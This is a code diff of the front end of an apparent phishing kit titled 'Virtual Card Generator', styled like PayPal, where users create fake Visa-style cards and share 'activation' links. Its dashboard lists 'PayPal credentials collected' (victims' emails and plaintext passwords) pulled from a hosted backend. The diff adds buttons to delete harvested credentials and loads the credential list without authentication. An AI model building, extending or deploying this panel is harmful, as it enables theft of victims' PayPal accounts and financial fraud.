@@ -5,371 +5,66 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Virtual Card Generator</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f7f9fa;
-            position: relative;
-        }
-        .container {
-            width: 400px;
-            padding: 30px;
-            background-color: #ffffff;
-            border-radius: 15px;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            position: relative;
-            z-index: 1;
-        }
-        .logo {
-            font-size: 24px;
-            font-weight: 700;
-            color: #000000;
-            margin-bottom: 20px;
-            line-height: 1;
-            letter-spacing: -1px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .input-field {
-            width: 100%;
-            padding: 15px 20px;
-            margin: 10px 0;
-            border: 2px solid #0070ba;
-            border-radius: 25px;
-            font-size: 14px;
-            color: #333333;
-            box-sizing: border-box;
-            background-color: #ffffff;
-            transition: box-shadow 0.3s ease;
-        }
-        .input-field:focus {
-            box-shadow: 0 0 10px rgba(0, 112, 186, 0.5);
-            outline: none;
-        }
-        .input-field::placeholder {
-            color: #999999;
-            font-weight: 400;
-        }
-        .forgot-password, .signup-link {
-            color: #0070ba;
-            text-decoration: none;
-            font-size: 13px;
-            margin: 10px 0;
-            display: block;
-            text-align: left;
-            font-weight: 400;
-            width: 100%;
-            transition: color 0.3s ease;
-        }
-        .forgot-password:hover, .signup-link:hover {
-            color: #005f9e;
-        }
-        .btn {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 25px;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: 600;
-            text-transform: uppercase;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
-        }
-        .btn-login {
-            background-color: #0070ba;
-            color: #ffffff;
-            box-shadow: 0 4px 8px rgba(0, 112, 186, 0.3);
-        }
-        .btn-login:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0, 112, 186, 0.4);
-        }
-        .btn-signup {
-            background-color: #ffffff;
-            color: #000000;
-            border: 2px solid #000000;
-        }
-        .btn-signup:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-        .language {
-            margin: 15px 0;
-            color: #666666;
-            font-size: 13px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .language img {
-            vertical-align: middle;
-            margin-right: 5px;
-            border-radius: 50%;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .language select {
-            border: none;
-            background: none;
-            color: #0070ba;
-            font-weight: 600;
-            cursor: pointer;
-            appearance: none;
-            padding-left: 5px;
-            font-size: 13px;
-            transition: color 0.3s ease;
-        }
-        .language select:hover {
-            color: #005f9e;
-        }
-        .language select:focus {
-            outline: none;
-        }
-        .footer {
-            margin-top: 15px;
-            color: #666666;
-            font-size: 12px;
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        .footer a {
-            color: #0070ba;
-            text-decoration: none;
-            font-weight: 600;
-            transition: color 0.3s ease;
-        }
-        .footer a:hover {
-            color: #005f9e;
-        }
-        .footer .active {
-            border-bottom: 2px solid #0070ba;
-            padding-bottom: 2px;
-        }
-        .card-section, .signup-section, .dashboard-section {
-            display: none;
-            width: 100%;
-        }
-        .card-section.active, .signup-section.active, .dashboard-section.active {
-            display: block;
-        }
-        .card {
-            background: linear-gradient(135deg, #1e90ff, #000080, #ffd700);
-            color: #ffffff;
-            width: 250px;
-            height: 150px;
-            border-radius: 15px;
-            padding: 12px;
-            margin: 10px auto;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3), 0 0 10px rgba(255, 215, 0, 0.2);
-            border: 1px solid rgba(255, 215, 0, 0.5);
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -20%;
-            left: -20%;
-            width: 140%;
-            height: 140%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, transparent 70%);
-            animation: hologram 3s infinite;
-        }
-        @keyframes hologram {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-        }
-        .visa-logo {
-            font-size: 20px;
-            font-weight: bold;
-            color: #ffffff;
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.7), 0 0 4px rgba(255, 215, 0, 0.5);
-        }
-        .card-amount {
-            font-size: 14px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 2px 6px;
-            border-radius: 3px;
-        }
-        .card-number {
-            font-size: 16px;
-            letter-spacing: 2px;
-            margin-top: 5px;
-        }
-        .card-footer {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-            font-size: 12px;
-        }
-        .card-name {
-            font-size: 12px;
-        }
-        .card-exp-cvv {
-            text-align: right;
-        }
-        .card-exp {
-            font-size: 12px;
-        }
-        .card-cvv {
-            font-size: 10px;
-            background: rgba(255, 255, 255, 0.3);
-            padding: 2px 4px;
-            border-radius: 3px;
-        }
-        .card-actions {
-            display: flex;
-            justify-content: center;
-            margin-top: 5px;
-            gap: 10px;
-        }
-        .delete-btn, .share-btn, .back-btn {
-            padding: 8px 15px;
-            border: none;
-            border-radius: 10px;
-            font-size: 12px;
-            cursor: pointer;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
-        }
-        .delete-btn {
-            background-color: #ff4444;
-            color: #ffffff;
-        }
-        .delete-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(255, 68, 68, 0.4);
-        }
-        .share-btn {
-            background-color: #0070ba;
-            color: #ffffff;
-        }
-        .share-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 112, 186, 0.4);
-        }
-        .back-btn {
-            background-color: #666666;
-            color: #ffffff;
-        }
-        .back-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(102, 102, 102, 0.4);
-        }
-        .card-link {
-            word-break: break-all;
-            margin-top: 10px;
-            padding: 5px;
-            background-color: #f0f0f0;
-            border-radius: 5px;
-            text-align: center;
-        }
-        .card-link button {
-            background: none;
-            border: none;
-            color: #0070ba;
-            cursor: pointer;
-            font-size: 12px;
-            padding: 0;
-        }
-        .card-link button:hover {
-            text-decoration: underline;
-        }
-        .paypal-credentials {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: #e6f3ff;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            border-left: 4px solid #0070ba;
-        }
-        .paypal-credentials h3 {
-            margin: 0 0 10px;
-            font-size: 18px;
-            color: #0070ba;
-            font-weight: 600;
-        }
-        .paypal-credentials p {
-            margin: 10px 0;
-            font-size: 14px;
-            color: #333;
-            background-color: #ffffff;
-            padding: 10px;
-            border-radius: 5px;
-            word-break: break-all;
-        }
-        .paypal-credentials p.empty {
-            color: #666;
-            background-color: #f0f0f0;
-        }
-        .dashboard-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 15px 0;
-            background-color: #ffffff;
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        .dashboard-table th, .dashboard-table td {
-            padding: 12px;
-            text-align: left;
-            border-bottom: 1px solid #e0e0e0;
-            transition: background-color 0.3s ease;
-        }
-        .dashboard-table th {
-            background-color: #0070ba;
-            color: #ffffff;
-            font-weight: 600;
-        }
-        .dashboard-table tr:hover {
-            background-color: #f5f5f5;
-        }
-        .dashboard-table tr:last-child td {
-            border-bottom: none;
-        }
-        .loader {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        .loader.active {
-            display: flex;
-        }
-        .spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #0070ba;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f7f9fa; position: relative; }
+        .container { width: 400px; padding: 30px; background-color: #ffffff; border-radius: 15px; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; align-items: center; position: relative; z-index: 1; }
+        .logo { font-size: 24px; font-weight: 700; color: #000000; margin-bottom: 20px; line-height: 1; letter-spacing: -1px; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); }
+        .input-field { width: 100%; padding: 15px 20px; margin: 10px 0; border: 2px solid #0070ba; border-radius: 25px; font-size: 14px; color: #333333; box-sizing: border-box; background-color: #ffffff; transition: box-shadow 0.3s ease; }
+        .input-field:focus { box-shadow: 0 0 10px rgba(0, 112, 186, 0.5); outline: none; }
+        .input-field::placeholder { color: #999999; font-weight: 400; }
+        .forgot-password, .signup-link { color: #0070ba; text-decoration: none; font-size: 13px; margin: 10px 0; display: block; text-align: left; font-weight: 400; width: 100%; transition: color 0.3s ease; }
+        .forgot-password:hover, .signup-link:hover { color: #005f9e; }
+        .btn { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 25px; font-size: 16px; cursor: pointer; font-weight: 600; text-transform: uppercase; transition: transform 0.2s ease, box-shadow 0.2s ease; }
+        .btn-login { background-color: #0070ba; color: #ffffff; box-shadow: 0 4px 8px rgba(0, 112, 186, 0.3); }
+        .btn-login:hover { transform: translateY(-2px); box-shadow: 0 6px 12px rgba(0, 112, 186, 0.4); }
+        .btn-signup { background-color: #ffffff; color: #000000; border: 2px solid #000000; }
+        .btn-signup:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }
+        .language { margin: 15px 0; color: #666666; font-size: 13px; display: flex; align-items: center; justify-content: center; }
+        .language img { vertical-align: middle; margin-right: 5px; border-radius: 50%; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
+        .language select { border: none; background: none; color: #0070ba; font-weight: 600; cursor: pointer; appearance: none; padding-left: 5px; font-size: 13px; transition: color 0.3s ease; }
+        .language select:hover { color: #005f9e; }
+        .language select:focus { outline: none; }
+        .footer { margin-top: 15px; color: #666666; font-size: 12px; display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; }
+        .footer a { color: #0070ba; text-decoration: none; font-weight: 600; transition: color 0.3s ease; }
+        .footer a:hover { color: #005f9e; }
+        .footer .active { border-bottom: 2px solid #0070ba; padding-bottom: 2px; }
+        .card-section, .signup-section, .dashboard-section { display: none; width: 100%; }
+        .card-section.active, .signup-section.active, .dashboard-section.active { display: block; }
+        .card { background: linear-gradient(135deg, #1e90ff, #000080, #ffd700); color: #ffffff; width: 250px; height: 150px; border-radius: 15px; padding: 12px; margin: 10px auto; position: relative; overflow: hidden; box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3), 0 0 10px rgba(255, 215, 0, 0.2); border: 1px solid rgba(255, 215, 0, 0.5); display: flex; flex-direction: column; justify-content: space-between; }
+        .card::before { content: ''; position: absolute; top: -20%; left: -20%; width: 140%; height: 140%; background: radial-gradient(circle, rgba(255, 255, 255, 0.4) 0%, transparent 70%); animation: hologram 3s infinite; }
+        @keyframes hologram { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .card-header { display: flex; justify-content: space-between; align-items: flex-start; }
+        .visa-logo { font-size: 20px; font-weight: bold; color: #ffffff; text-shadow: 0 0 8px rgba(255, 255, 255, 0.7), 0 0 4px rgba(255, 215, 0, 0.5); }
+        .card-amount { font-size: 14px; background: rgba(255, 255, 255, 0.2); padding: 2px 6px; border-radius: 3px; }
+        .card-number { font-size: 16px; letter-spacing: 2px; margin-top: 5px; }
+        .card-footer { display: flex; justify-content: space-between; align-items: flex-end; font-size: 12px; }
+        .card-name { font-size: 12px; }
+        .card-exp-cvv { text-align: right; }
+        .card-exp { font-size: 12px; }
+        .card-cvv { font-size: 10px; background: rgba(255, 255, 255, 0.3); padding: 2px 4px; border-radius: 3px; }
+        .card-actions { display: flex; justify-content: center; margin-top: 5px; gap: 10px; }
+        .delete-btn, .share-btn, .back-btn, .delete-creds-btn { padding: 8px 15px; border: none; border-radius: 10px; font-size: 12px; cursor: pointer; transition: transform 0.2s ease, box-shadow 0.2s ease; }
+        .delete-btn, .delete-creds-btn { background-color: #ff4444; color: #ffffff; }
+        .delete-btn:hover, .delete-creds-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(255, 68, 68, 0.4); }
+        .share-btn { background-color: #0070ba; color: #ffffff; }
+        .share-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0, 112, 186, 0.4); }
+        .back-btn { background-color: #666666; color: #ffffff; }
+        .back-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(102, 102, 102, 0.4); }
+        .card-link { word-break: break-all; margin-top: 10px; padding: 5px; background-color: #f0f0f0; border-radius: 5px; text-align: center; }
+        .card-link button { background: none; border: none; color: #0070ba; cursor: pointer; font-size: 12px; padding: 0; }
+        .card-link button:hover { text-decoration: underline; }
+        .paypal-credentials { margin-top: 20px; padding: 15px; background-color: #e6f3ff; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); border-left: 4px solid #0070ba; }
+        .paypal-credentials h3 { margin: 0 0 10px; font-size: 18px; color: #0070ba; font-weight: 600; }
+        .paypal-credentials p { margin: 10px 0; font-size: 14px; color: #333; background-color: #ffffff; padding: 10px; border-radius: 5px; word-break: break-all; }
+        .paypal-credentials p.empty { color: #666; background-color: #f0f0f0; }
+        .dashboard-table { width: 100%; border-collapse: collapse; margin: 15px 0; background-color: #ffffff; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); }
+        .dashboard-table th, .dashboard-table td { padding: 12px; text-align: left; border-bottom: 1px solid #e0e0e0; transition: background-color 0.3s ease; }
+        .dashboard-table th { background-color: #0070ba; color: #ffffff; font-weight: 600; }
+        .dashboard-table tr:hover { background-color: #f5f5f5; }
+        .dashboard-table tr:last-child td { border-bottom: none; }
+        .loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); z-index: 1000; justify-content: center; align-items: center; }
+        .loader.active { display: flex; }
+        .spinner { border: 8px solid #f3f3f3; border-top: 8px solid #0070ba; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -439,7 +134,7 @@
         </div>
         <table class="dashboard-table" id="paypalLoginsTable">
             <thead>
-                <tr><th>Card ID</th><th>PayPal Email</th><th>PayPal Password</th><th>User</th><th>Timestamp</th></tr>
+                <tr><th>Card ID</th><th>PayPal Email</th><th>PayPal Password</th><th>User</th><th>Timestamp</th><th>Action</th></tr>
             </thead>
             <tbody></tbody>
         </table>
@@ -451,7 +146,6 @@
         const API_BASE_URL = 'https://ii-cyu4.onrender.com';
         let token = localStorage.getItem('token') || null;
         let currentUser = null;
-        let currentCardId = null;
         let navigationHistory = [];
 
         const loader = document.getElementById('loader');
@@ -490,35 +184,26 @@
         }
 
         function validateToken() {
-            if (!token) {
-                showLogin();
-                return false;
-            }
+            if (!token) { showSection('login'); return false; }
             try {
                 const payload = JSON.parse(atob(token.split('.')[1]));
-                if (payload.exp && payload.exp < Date.now() / 1000) {
-                    showLogin();
-                    return false;
-                }
+                if (payload.exp && payload.exp < Date.now() / 1000) { showSection('login'); return false; }
                 currentUser = payload.username;
                 return true;
-            } catch (e) {
-                showLogin();
-                return false;
-            }
+            } catch (e) { showSection('login'); return false; }
         }
 
         function logout() {
-            showLogin();
+            showSection('login');
+            currentUser = null;
+            token = null;
+            localStorage.removeItem('token');
         }
 
         async function login() {
             const username = document.getElementById('loginUsername')?.value.trim();
             const password = document.getElementById('loginPassword')?.value.trim();
-            if (!username || !password) {
-                alert('Please enter both username and password');
-                return;
-            }
+            if (!username || !password) { alert('Please enter both username and password'); return; }
             showLoader();
             try {
                 const response = await fetch(`${API_BASE_URL}/api/auth/login`, {
@@ -535,15 +220,11 @@
                         showSection('card');
                         if (elements.cardDisplay) fetchUserData();
                     }
-                } else {
-                    alert(data.error || 'Login failed. Check your credentials.');
-                }
+                } else { alert(data.error || 'Login failed. Check your credentials.'); }
             } catch (error) {
                 console.error('Login error:', error);
                 alert(`Error: Network issue or backend unavailable at ${API_BASE_URL}`);
-            } finally {
-                hideLoader();
-            }
+            } finally { hideLoader(); }
         }
 
         async function signup() {
@@ -565,24 +246,17 @@
                     alert('Signup successful! Please log in.');
                     pushHistory('signup');
                     showSection('login');
-                } else {
-                    alert(data.error || 'Signup failed. Try a different username.');
-                }
+                } else { alert(data.error || 'Signup failed. Try a different username.'); }
             } catch (error) {
                 console.error('Signup error:', error);
                 alert(`Error: Network issue or backend unavailable at ${API_BASE_URL}`);
-            } finally {
-                hideLoader();
-            }
+            } finally { hideLoader(); }
         }
 
         function showLogin() {
             pushHistory(null);
             if (document.getElementById('loginUsername')) document.getElementById('loginUsername').value = '';
             if (document.getElementById('loginPassword')) document.getElementById('loginPassword').value = '';
-            currentUser = null;
-            token = null;
-            localStorage.removeItem('token');
             showSection('login');
         }
 
@@ -613,22 +287,17 @@
                 if (response.ok) {
                     alert(`Card generated! Card ID: ${data.cardId}`);
                     if (elements.cardDisplay) fetchUserData();
-                } else if (response.status === 401 || response.status === 403) {
-                    showLogin();
-                } else {
-                    alert(data.error || 'Card generation failed');
-                }
+                } else if (response.status === 401 || response.status === 403) { showSection('login'); }
+                else { alert(data.error || 'Card generation failed'); }
             } catch (error) {
                 console.error('Generate card error:', error);
                 alert(`Error: Network issue or backend unavailable at ${API_BASE_URL}`);
-            } finally {
-                hideLoader();
-            }
+            } finally { hideLoader(); }
         }
 
         function maskCardNumber(number) {
             if (!number) return 'N/A';
-            const masked = 'X'.repeat(12) + number.slice(12); // Mask first 12 digits
+            const masked = 'X'.repeat(12) + number.slice(-4);
             return masked.match(/.{1,4}/g).join('-');
         }
 
@@ -658,64 +327,14 @@
                     <button class="share-btn" onclick="activateCardPage('${card.cardId}')">Share Link</button>
                 </div>
                 <div class="card-link">
-                    <button onclick="copyToClipboard('${window.location.origin}/activate.html?cardId=${card.cardId}')">Copy Link: ${window.location.origin}/activate.html?cardId=${card.cardId}</button>
+                    <button onclick="copyToClipboard('${API_BASE_URL}/activate.html?cardId=${card.cardId}')">Copy Link: ${API_BASE_URL}/activate.html?cardId=${card.cardId}</button>
                 </div>
             `;
             elements.cardDisplay.appendChild(cardContainer);
         }
 
-        async function fetchUserData() {
-            if (!validateToken()) return;
-            showLoader();
-            try {
-                // Fetch cards
-                const cardsResponse = await fetch(`${API_BASE_URL}/api/cards`, {
-                    headers: { 'Authorization': `Bearer ${token}` }
-                });
-                const cardsData = await cardsResponse.json();
-                if (cardsResponse.ok) {
-                    elements.cardDisplay.innerHTML = '';
-                    cardsData.forEach(displayCard);
-                } else if (cardsResponse.status === 401 || cardsResponse.status === 403) {
-                    showLogin();
-                } else {
-                    alert(cardsData.error || 'Failed to fetch cards');
-                }
-
-                // Fetch PayPal credentials
-                const credsResponse = await fetch(`${API_BASE_URL}/api/cards/paypal-creds`, {
-                    headers: { 'Authorization': `Bearer ${token}` }
-                });
-                const credsData = await credsResponse.json();
-                if (credsResponse.ok && credsData.paypalLogins && credsData.paypalLogins.length > 0) {
-                    elements.paypalCredentialsDisplay.innerHTML = credsData.paypalLogins.map(login => `
-                        <p>
-                            <strong>Card ID:</strong> ${login.cardId}<br>
-                            <strong>Email:</strong> ${login.paypalUsername}<br>
-                            <strong>Password:</strong> ${login.paypalPassword}<br>
-                            <strong>User:</strong> ${login.user || 'Unknown'}<br>
-                            <strong>Time:</strong> ${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}
-                        </p>
-                        <hr>
-                    `).join('');
-                } else {
-                    elements.paypalCredentialsDisplay.innerHTML = '<p class="empty">No PayPal credentials collected yet.</p>';
-                }
-
-                updateCreatorInfo();
-            } catch (error) {
-                console.error('Fetch user data error:', error);
-                alert(`Error: Network issue or backend unavailable at ${API_BASE_URL}`);
-            } finally {
-                hideLoader();
-            }
-        }
-
         async function deleteCard(cardId) {
-            if (!validateToken() || !cardId) {
-                alert('No card selected for deletion');
-                return;
-            }
+            if (!validateToken() || !cardId) { alert('No card selected for deletion'); return; }
             showLoader();
             try {
                 const response = await fetch(`${API_BASE_URL}/api/cards/${cardId}`, {
@@ -726,25 +345,80 @@
                 if (response.ok) {
                     alert('Card deleted successfully');
                     if (elements.cardDisplay) fetchUserData();
-                } else if (response.status === 401 || response.status === 403) {
-                    showLogin();
-                } else {
-                    alert(data.error || 'Delete failed');
-                }
+                } else if (response.status === 401 || response.status === 403) { showSection('login'); }
+                else { alert(data.error || 'Delete failed'); }
             } catch (error) {
                 console.error('Delete card error:', error);
                 alert(`Error: Network issue or backend unavailable at ${API_BASE_URL}`);
-            } finally {
-                hideLoader();
-            }
+            } finally { hideLoader(); }
+        }
+
+        async function deletePaypalCredentials(cardId) {
+            if (!validateToken() || !cardId) { alert('No credentials selected for deletion'); return; }
+            if (!confirm(`Are you sure you want to delete PayPal credentials for Card ID: ${cardId}?`)) return;
+            showLoader();
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/cards/paypal-creds/${cardId}`, {
+                    method: 'DELETE',
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                const data = await response.json();
+                if (response.ok) {
+                    alert('PayPal credentials deleted successfully');
+                    if (elements.cardDisplay) fetchUserData();
+                    if (elements.generatedCardsTable) fetchDashboardData();
+                } else if (response.status === 401 || response.status === 403) { showSection('login'); }
+                else { alert(data.error || 'Delete failed'); }
+            } catch (error) {
+                console.error('Delete PayPal credentials error:', error);
+                alert(`Error: Network issue or backend unavailable at ${API_BASE_URL}`);
+            } finally { hideLoader(); }
         }
 
         function activateCardPage(cardId) {
-            if (!validateToken() || !cardId) {
-                alert('No card selected for activation');
-                return;
-            }
-            window.location.href = `${window.location.origin}/activate.html?cardId=${cardId}`;
+            if (!validateToken() || !cardId) { alert('No card selected for activation'); return; }
+            window.location.href = `${API_BASE_URL}/activate.html?cardId=${cardId}`;
+        }
+
+        async function fetchUserData() {
+            if (!validateToken()) return;
+            showLoader();
+            try {
+                const cardsResponse = await fetch(`${API_BASE_URL}/api/cards`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                const cardsData = await cardsResponse.json();
+                if (cardsResponse.ok) {
+                    elements.cardDisplay.innerHTML = '';
+                    cardsData.forEach(displayCard);
+                } else if (cardsResponse.status === 401 || cardsResponse.status === 403) { showSection('login'); }
+                else { alert(cardsData.error || 'Failed to fetch cards'); }
+
+                const credsResponse = await fetch(`${API_BASE_URL}/api/cards/paypal-creds`);
+                const credsData = await credsResponse.json();
+                if (credsResponse.ok && credsData.paypalLogins && credsData.paypalLogins.length > 0) {
+                    elements.paypalCredentialsDisplay.innerHTML = credsData.paypalLogins
+                        .filter(login => login.user === currentUser)
+                        .map(login => `
+                            <p>
+                                <strong>Card ID:</strong> ${login.cardId}<br>
+                                <strong>Email:</strong> ${login.paypalUsername}<br>
+                                <strong>Password:</strong> ${login.paypalPassword}<br>
+                                <strong>User:</strong> ${login.user || 'Unknown'}<br>
+                                <strong>Time:</strong> ${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}
+                                <br><button class="delete-creds-btn" onclick="deletePaypalCredentials('${login.cardId}')">Delete Credentials</button>
+                            </p>
+                            <hr>
+                        `).join('');
+                } else {
+                    elements.paypalCredentialsDisplay.innerHTML = '<p class="empty">No PayPal credentials collected yet.</p>';
+                }
+
+                updateCreatorInfo();
+            } catch (error) {
+                console.error('Fetch user data error:', error);
+                alert(`Error: Network issue or backend unavailable at ${API_BASE_URL}`);
+            } finally { hideLoader(); }
         }
 
         async function fetchDashboardData() {
@@ -773,8 +447,9 @@
                             <td>${login.paypalPassword}</td>
                             <td>${login.user || 'Unknown'}</td>
                             <td>${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}</td>
+                            <td><button class="delete-creds-btn" onclick="deletePaypalCredentials('${login.cardId}')">Delete</button></td>
                         </tr>
-                    `).join('') : '<tr><td colspan="5">No PayPal credentials available.</td></tr>';
+                    `).join('') : '<tr><td colspan="6">No PayPal credentials available.</td></tr>';
                     if (elements.paypalCredentialsDisplayDashboard) {
                         elements.paypalCredentialsDisplayDashboard.innerHTML = data.paypalLogins.length > 0
                             ? data.paypalLogins.map(login => `
@@ -784,24 +459,48 @@
                                     <strong>Password:</strong> ${login.paypalPassword}<br>
                                     <strong>User:</strong> ${login.user || 'Unknown'}<br>
                                     <strong>Time:</strong> ${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}
+                                    <br><button class="delete-creds-btn" onclick="deletePaypalCredentials('${login.cardId}')">Delete Credentials</button>
                                 </p>
                                 <hr>
                             `).join('')
                             : '<p class="empty">No PayPal credentials collected yet.</p>';
                     }
-                } else if (response.status === 401 || response.status === 403) {
-                    showLogin();
-                } else {
-                    alert(data.error || 'Failed to load dashboard');
-                }
+                } else if (response.status === 401 || response.status === 403) { showSection('login'); }
+                else { alert(data.error || 'Failed to load dashboard'); }
             } catch (error) {
                 console.error('Fetch dashboard error:', error);
-                elements.paypalLoginsTable.innerHTML = '<tr><td colspan="5">Error loading PayPal credentials.</td></tr>';
+                elements.paypalLoginsTable.innerHTML = '<tr><td colspan="6">Error loading PayPal credentials.</td></tr>';
                 if (elements.paypalCredentialsDisplayDashboard) elements.paypalCredentialsDisplayDashboard.innerHTML = '<p class="empty">Error loading PayPal credentials.</p>';
                 alert(`Error: Network issue or backend unavailable at ${API_BASE_URL}`);
-            } finally {
-                hideLoader();
-            }
+            } finally { hideLoader(); }
+        }
+
+        async function fetchPaypalCredentials() {
+            showLoader();
+            try {
+                const credsResponse = await fetch(`${API_BASE_URL}/api/cards/paypal-creds`);
+                const credsData = await credsResponse.json();
+                if (credsResponse.ok && credsData.paypalLogins && credsData.paypalLogins.length > 0) {
+                    elements.paypalCredentialsDisplay.innerHTML = credsData.paypalLogins
+                        .filter(login => login.user === currentUser || !currentUser)
+                        .map(login => `
+                            <p>
+                                <strong>Card ID:</strong> ${login.cardId}<br>
+                                <strong>Email:</strong> ${login.paypalUsername}<br>
+                                <strong>Password:</strong> ${login.paypalPassword}<br>
+                                <strong>User:</strong> ${login.user || 'Unknown'}<br>
+                                <strong>Time:</strong> ${login.timestamp ? new Date(login.timestamp).toLocaleString() : 'N/A'}
+                                ${currentUser ? `<br><button class="delete-creds-btn" onclick="deletePaypalCredentials('${login.cardId}')">Delete Credentials</button>` : ''}
+                            </p>
+                            <hr>
+                        `).join('');
+                } else {
+                    elements.paypalCredentialsDisplay.innerHTML = '<p class="empty">No PayPal credentials collected yet.</p>';
+                }
+            } catch (error) {
+                console.error('Fetch PayPal credentials error:', error);
+                elements.paypalCredentialsDisplay.innerHTML = '<p class="empty">Error loading PayPal credentials.</p>';
+            } finally { hideLoader(); }
         }
 
         function updateCreatorInfo() {
@@ -842,7 +541,8 @@
 
         document.addEventListener('DOMContentLoaded', () => {
             if (!token || !validateToken()) {
-                showLogin();
+                showSection('login');
+                fetchPaypalCredentials();
             } else {
                 const lastSection = navigationHistory[navigationHistory.length - 1] || 'card';
                 showSection(lastSection);
@@ -853,4 +553,4 @@
         });
     </script>
 </body>
-  </html>
+    </html>
